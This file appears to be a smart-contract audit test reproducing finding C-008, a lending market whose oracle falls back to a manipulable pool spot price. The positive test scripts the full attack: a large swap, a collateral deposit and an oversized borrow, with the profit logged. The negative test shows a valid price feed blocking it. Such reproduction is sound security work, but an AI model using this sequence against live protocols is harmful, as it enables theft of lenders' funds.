import assert from "node:assert/strict";
import { before, test } from "node:test";
import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";

let artifacts;

before(async () => {
  artifacts = await compileAll();
});

async function setup(feedAnswer) {
  const chain = await makeChain();
  const [admin, liquidityProvider, attacker] = chain.signers;
  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
  const stable = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
  const pool = await deploy(artifacts, "ReservePool", admin, [await asset.getAddress(), await stable.getAddress()]);
  const feed = await deploy(artifacts, "MockFeed", admin, [8, feedAnswer]);
  const oracle = await deploy(artifacts, "ReserveOracle", admin, [await feed.getAddress(), await pool.getAddress()]);
  const market = await deploy(artifacts, "LendingMarket", admin, [
    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await admin.getAddress()
  ]);
  const attackerAddress = await attacker.getAddress();

  await send(asset.mint(await liquidityProvider.getAddress(), ether(10_000)));
  await send(stable.mint(await liquidityProvider.getAddress(), ether(10_000)));
  await send(asset.connect(liquidityProvider).approve(await pool.getAddress(), ether(10_000)));
  await send(stable.connect(liquidityProvider).approve(await pool.getAddress(), ether(10_000)));
  await send(pool.connect(liquidityProvider).addLiquidity(ether(10_000), ether(10_000)));
  await send(stable.mint(await market.getAddress(), ether(100_000)));
  await send(stable.mint(attackerAddress, ether(10_000)));
  return { attacker, attackerAddress, asset, stable, vault, pool, oracle, market };
}

async function manipulateAndDeposit(context) {
  await send(context.stable.connect(context.attacker).approve(await context.pool.getAddress(), ether(10_000)));
  await send(context.pool.connect(context.attacker).swapExactInput(
    await context.stable.getAddress(), ether(10_000), 0, context.attackerAddress
  ));
  const acquiredAsset = await context.asset.balanceOf(context.attackerAddress);
  await send(context.asset.connect(context.attacker).approve(await context.vault.getAddress(), acquiredAsset));
  await send(context.vault.connect(context.attacker).deposit(acquiredAsset, context.attackerAddress));
  const shares = await context.vault.balanceOf(context.attackerAddress);
  await send(context.vault.connect(context.attacker).approve(await context.market.getAddress(), shares));
  await send(context.market.connect(context.attacker).depositCollateral(shares, context.attackerAddress));
  return { acquiredAsset, shares };
}

test("positive: fallback to manipulable pool spot creates profitable undercollateralized borrowing", async () => {
  const context = await setup(0);
  const { acquiredAsset } = await manipulateAndDeposit(context);
  const manipulatedPrice = await context.oracle.price();
  const manipulatedLimit = await context.market.borrowLimit(context.attackerAddress);
  const safeLimitAtOneDollar = acquiredAsset * 7_500n / 10_000n;

  assert(manipulatedPrice > ether(3));
  assert(manipulatedLimit > safeLimitAtOneDollar * 3n);
  await send(context.market.connect(context.attacker).borrow(
    manipulatedLimit, context.attackerAddress, "0x"
  ));
  const attackerStableAfter = await context.stable.balanceOf(context.attackerAddress);
  assert.equal(await context.market.debt(context.attackerAddress), manipulatedLimit);
  assert(manipulatedLimit > safeLimitAtOneDollar);
  assert(attackerStableAfter > ether(10_000));
  console.log(JSON.stringify({ oracle: "C-008-positive", startingStable: String(ether(10_000)), acquiredAsset: String(acquiredAsset), manipulatedPrice: String(manipulatedPrice), safeLimitAtOneDollar: String(safeLimitAtOneDollar), debtAfter: String(await context.market.debt(context.attackerAddress)), finalLiquidStable: String(attackerStableAfter) }));
});

test("negative: a positive primary feed ignores the same pool manipulation and blocks excess borrowing", async () => {
  const context = await setup(100_000_000);
  const { acquiredAsset } = await manipulateAndDeposit(context);
  const primaryPrice = await context.oracle.price();
  const safeLimit = await context.market.borrowLimit(context.attackerAddress);
  assert.equal(primaryPrice, ether(1));
  assert.equal(safeLimit, acquiredAsset * 7_500n / 10_000n);

  await expectRevert(context.market.connect(context.attacker).borrow(
    ether(10_000), context.attackerAddress, "0x"
  ));
  assert.equal(await context.market.debt(context.attackerAddress), 0n);
  console.log(JSON.stringify({ oracle: "C-008-negative", primaryPrice: String(primaryPrice), safeLimit: String(safeLimit), excessBorrowRejected: true, debtAfter: "0" }));
});

